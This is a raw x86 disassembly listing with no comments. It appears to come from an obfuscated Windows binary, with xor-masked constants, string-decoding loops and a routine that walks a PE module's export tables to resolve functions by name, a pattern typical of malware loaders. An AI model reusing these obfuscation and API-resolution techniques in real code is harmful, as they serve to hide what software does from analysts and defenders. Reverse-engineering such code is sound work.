  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
  4228f0:	jmp    0x422905
  4228f2:	xor    eax,0x8a9d
  4228f7:	add    eax,0x3b5f
  4228fc:	mov    WORD PTR [ecx],ax
  4228ff:	add    ecx,0x2
  422902:	add    edx,0x2
  422905:	movzx  eax,WORD PTR [edx]
  422908:	mov    ebx,0x4e3c
  42290d:	cmp    ax,bx
  422910:	jne    0x4228f2
  422912:	xor    eax,eax
  422914:	mov    WORD PTR [ecx],ax
  422917:	mov    eax,DWORD PTR [edi+0x188]
  42291d:	pop    ebx
  42291e:	ret    
  42291f:	push   edi
  422920:	mov    edi,eax
  422922:	mov    eax,DWORD PTR [esi+0x188]
  422928:	shl    edi,0x6
  42292b:	add    eax,edi
  42292d:	jmp    0x422939
  42292f:	xor    cl,0x81
  422932:	add    cl,0x6
  422935:	mov    BYTE PTR [eax],cl
  422937:	inc    eax
  422938:	inc    edx
  422939:	mov    cl,BYTE PTR [edx]
  42293b:	cmp    cl,0x7b
  42293e:	jne    0x42292f
  422940:	mov    BYTE PTR [eax],0x0
  422943:	mov    eax,DWORD PTR [esi+0x188]
  422949:	add    eax,edi
  42294b:	pop    edi
  42294c:	ret    
  42294d:	push   ebp
  42294e:	mov    ebp,esp
  422950:	sub    esp,0x14
  422953:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42295a:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  422961:	mov    eax,DWORD PTR [ebx]
  422963:	mov    DWORD PTR [ebp-0x8],eax
  422966:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42296d:	push   esi
  42296e:	push   edi
  42296f:	mov    DWORD PTR [ebp-0x14],0xead71895
  422976:	mov    edi,DWORD PTR [ebp-0x4]
  422979:	mov    ecx,DWORD PTR [ebp-0x10]
  42297c:	mov    eax,0x75108b3
  422981:	xor    edi,eax
  422983:	mov    edx,0x3272fa
  422988:	xor    ecx,eax
  42298a:	add    edi,edx
  42298c:	add    ecx,edx
  42298e:	imul   edi,ecx
  422991:	jmp    0x4229d9
  422993:	mov    ecx,DWORD PTR [ebp-0x8]
  422996:	mov    esi,DWORD PTR [ebp-0x4]
  422999:	xor    ecx,eax
  42299b:	xor    esi,eax
  42299d:	add    ecx,edx
  42299f:	add    esi,edx
  4229a1:	test   esi,ecx
  4229a3:	mov    esi,DWORD PTR [ebp-0x8]
  4229a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4229a9:	je     0x4229c0
  4229ab:	xor    ecx,eax
  4229ad:	xor    esi,eax
  4229af:	add    ecx,edx
  4229b1:	add    esi,edx
  4229b3:	shr    esi,cl
  4229b5:	mov    ecx,DWORD PTR [ebp-0x14]
  4229b8:	xor    ecx,eax
  4229ba:	add    ecx,edx
  4229bc:	xor    esi,ecx
  4229be:	jmp    0x4229ca
  4229c0:	xor    esi,eax
  4229c2:	xor    ecx,eax
  4229c4:	add    esi,edx
  4229c6:	add    ecx,edx
  4229c8:	shr    esi,cl
  4229ca:	mov    DWORD PTR [ebp-0x8],esi
  4229cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4229d0:	xor    ecx,eax
  4229d2:	lea    edi,[edi+ecx*1+0x3272fa]
  4229d9:	mov    ecx,DWORD PTR [ebp-0xc]
  4229dc:	mov    esi,DWORD PTR [ebp-0x4]
  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
